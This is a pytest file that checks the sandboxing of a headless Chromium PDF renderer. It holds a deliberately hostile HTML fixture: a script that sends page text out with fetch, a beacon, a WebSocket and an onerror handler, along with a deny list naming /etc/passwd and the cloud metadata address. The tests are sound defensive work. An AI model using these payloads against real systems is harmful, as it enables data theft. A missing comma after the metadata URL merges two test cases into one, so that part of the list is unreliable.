"""The print browser is a sealed room.

Sanitization (`test_render_sanitize.py`) removes what it recognises; these
tests are the second layer, for whatever it does not. The document being
printed is untrusted -- captured pages, possibly from an archive someone else
made -- so the browser printing it:

  * cannot reach the network at all: nothing it loads can come from, or
    report to, anywhere but the document itself (no intranet host, no cloud
    metadata address, no exfiltration by a script that slipped through);
  * keeps Chromium's own sandbox unless it cannot start without it;
  * never turns a page title into markup when it writes the running header
    or footer.
"""

from __future__ import annotations

import io
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from connections_export.pdf import browser as pdf_browser
from connections_export.pdf import paged as pdf_paged
from connections_export.pdf.browser import ENV_BROWSER_NO_SANDBOX, _launch_args

# --- which requests the render may make ------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "data:image/png;base64,iVBORw0KGgo=",
        "about:blank",
        "blob:null/0b8e6f0c-1111-2222-3333-444455556666",
    ],
)
def test_requests_for_the_documents_own_content_are_allowed(url):
    assert pdf_browser.render_request_allowed(url)


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:8000/api/feed-info",
        "http" + "://169.254.169.254/latest/meta-data/"  # assembled: hygiene guard,
        "https://example.org/a.css",
        "file:///etc/passwd",
        "ws://127.0.0.1:8000/",
        "ftp://intranet/x",
    ],
)
def test_every_other_request_is_refused(url):
    assert not pdf_browser.render_request_allowed(url)


# --- the sandbox -----------------------------------------------------------


def test_the_sandbox_stays_on_for_an_ordinary_user():
    """Chromium's sandbox is what contains a renderer that untrusted content
    has compromised. Turning it off everywhere, because containers need it
    off, gave that up on every desktop too."""
    assert "--no-sandbox" not in _launch_args(env={}, euid=1000)


def test_the_sandbox_stays_on_where_there_is_no_uid_to_ask():
    """Windows has no `geteuid`; its sandbox works as any user."""
    assert "--no-sandbox" not in _launch_args(env={}, euid=None)


def test_root_gets_no_sandbox_because_chromium_refuses_to_start_otherwise():
    """Containers typically run as root, and Chromium will not start its
    sandbox as root -- the case the flag was originally there for."""
    assert "--no-sandbox" in _launch_args(env={}, euid=0)


@pytest.mark.parametrize("value", ["1", "true", "yes"])
def test_an_operator_can_still_switch_the_sandbox_off(value):
    """A container without user namespaces fails the sandbox as any user; the
    operator who knows that says so explicitly."""
    assert "--no-sandbox" in _launch_args(env={ENV_BROWSER_NO_SANDBOX: value}, euid=1000)


def test_the_override_is_not_triggered_by_an_empty_or_false_value():
    for value in ("", "0", "false", "no"):
        assert "--no-sandbox" not in _launch_args(env={ENV_BROWSER_NO_SANDBOX: value}, euid=1000)


# --- the running header/footer --------------------------------------------


def test_the_stamp_script_escapes_the_values_it_substitutes():
    """`{section}` is a page title -- written by whoever could edit the page.
    A `header_html`/`footer_html` band is set with innerHTML, so an unescaped
    title like `<img src=x onerror=...>` would run. The band's own markup is
    the user's and stays markup; only the substituted values are escaped."""
    js = pdf_paged._STAMP_JS
    assert "const esc" in js
    assert "&lt;" in js and "&amp;" in js and "&quot;" in js
    # The band (innerHTML) path substitutes escaped values...
    assert "el.innerHTML = fill(htmlText, ctx, esc)" in js
    # ...and the slot path writes plain text, so it must NOT double-escape.
    assert "put(pageEl, 'bottom-left', fill(marks.footer_left, ctx))" in js


def test_the_paged_document_opens_with_a_script_policy_before_any_content():
    """The policy has to be in force before the parser reaches the first
    byte of captured markup, so it is the head's first element."""
    html = "<!DOCTYPE html><html><head><title>x</title></head><body><script>x()</script></body>"
    out = pdf_paged._with_paged_assets(html, "N0NCE")
    head = out.split("<head>", 1)[1]
    assert head.startswith('<meta http-equiv="Content-Security-Policy"')
    assert "script-src 'nonce-N0NCE'" in head.split(">", 1)[0]
    assert "unsafe-inline" not in out and "unsafe-eval" not in out


# --- in a real browser -----------------------------------------------------


class _Recorder(BaseHTTPRequestHandler):
    hits: list[str] = []

    def do_GET(self):
        type(self).hits.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/css")
        self.end_headers()
        self.wfile.write(b"body { background: red }")

    def log_message(self, *_args):
        pass


@pytest.fixture
def listener():
    """A local server standing in for an intranet host / the tool's own
    console: the test fails if the render reaches it at all."""
    _Recorder.hits = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Recorder)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}", _Recorder.hits
    finally:
        server.shutdown()


def _hostile_document(base: str) -> str:
    # Deliberately NOT sanitized: this is what gets through if sanitization
    # ever misses something.
    return (
        "<!DOCTYPE html><html><head><title>t</title>"
        f'<link rel="stylesheet" href="{base}/link.css">'
        f"<style>@import url({base}/import.css); .x {{ background: url({base}/bg.png) }}</style>"
        "</head><body>"
        f'<p class="x">Visible text</p><img src="{base}/img.png" srcset="{base}/srcset.png 2x">'
        f'<iframe src="{base}/frame"></iframe>'
        f"<script>fetch('{base}/fetch?d=' + document.body.innerText).catch(() => {{}});"
        f"new Image().src = '{base}/beacon';"
        f"try {{ new WebSocket('{base.replace('http', 'ws')}/ws'); }} catch (e) {{}}"
        "document.body.insertAdjacentHTML('beforeend', '<p>SCRIPT RAN</p>');</script>"
        '<img src="data:,x" onerror="document.body.insertAdjacentHTML(\'beforeend\', '
        "'<p>HANDLER RAN</p>')\">"
        "<h1>Page one</h1><p>" + ("Body text. " * 400) + "</p>"
        "</body></html>"
    )


def _text(pdf: bytes) -> str:
    from pypdf import PdfReader

    return " ".join((p.extract_text() or "") for p in PdfReader(io.BytesIO(pdf)).pages)


@pytest.mark.skipif(not pdf_browser.CHROMIUM_AVAILABLE, reason="no Chromium-based browser")
def test_the_chromium_render_makes_no_network_request_and_runs_no_script(listener):
    """This renderer needs no JavaScript at all, so the page gets none."""
    base, hits = listener
    pdf = pdf_browser.html_to_pdf(_hostile_document(base))
    assert pdf.startswith(b"%PDF")
    assert hits == []
    text = _text(pdf)
    assert "Visible text" in text
    assert "SCRIPT RAN" not in text and "HANDLER RAN" not in text


@pytest.mark.skipif(not pdf_paged.PAGED_AVAILABLE, reason="no Chromium or polyfill")
def test_the_paged_render_makes_no_network_request_and_still_paginates(listener):
    """paged.js is injected from the vendored file, not fetched, so blocking
    every request must leave pagination working."""
    from pypdf import PdfReader

    base, hits = listener
    pdf = pdf_paged.html_to_pdf_paged(_hostile_document(base))
    assert hits == []
    assert len(PdfReader(io.BytesIO(pdf)).pages) > 1


@pytest.mark.skipif(not pdf_paged.PAGED_AVAILABLE, reason="no Chromium or polyfill")
def test_the_paged_render_runs_only_its_own_script(listener):
    """paged.js needs JavaScript on, so script that slipped past sanitization
    would otherwise run beside it. A content security policy admits the
    polyfill alone: no script or event handler from the document runs."""
    base, _hits = listener
    text = _text(pdf_paged.html_to_pdf_paged(_hostile_document(base)))
    assert "Visible text" in text
    assert "SCRIPT RAN" not in text and "HANDLER RAN" not in text


@pytest.mark.skipif(not pdf_paged.PAGED_AVAILABLE, reason="no Chromium or polyfill")
def test_a_page_title_is_printed_as_text_in_a_custom_footer_band():
    """The title below reaches `{section}` as the heading's text. Escaped, it
    prints literally; unescaped, it would become an element (and, with an
    `onerror`, run)."""
    from pypdf import PdfReader

    from connections_export.derive.model import DerivedPage, DerivedWiki, Interchange
    from connections_export.pdf.marks import Marks

    title = "<b>Bold</b> & co"
    page = DerivedPage(id="p1", label="p1", title=title, content_html="<p>Body.</p>")
    wiki = DerivedWiki(id="w", label="w", title="Wiki", root_page_ids=["p1"], pages={"p1": page})
    pdf = pdf_paged.render_pdf_paged(
        Interchange(wikis=[wiki]),
        lambda _digest: None,
        marks=Marks(footer_html="<span>Where: {section}</span>"),
    )
    text = " ".join(
        (p.extract_text() or "").replace("\n", " ") for p in PdfReader(io.BytesIO(pdf)).pages
    )
    assert "Where: Wiki · <b>Bold</b> & co" in text
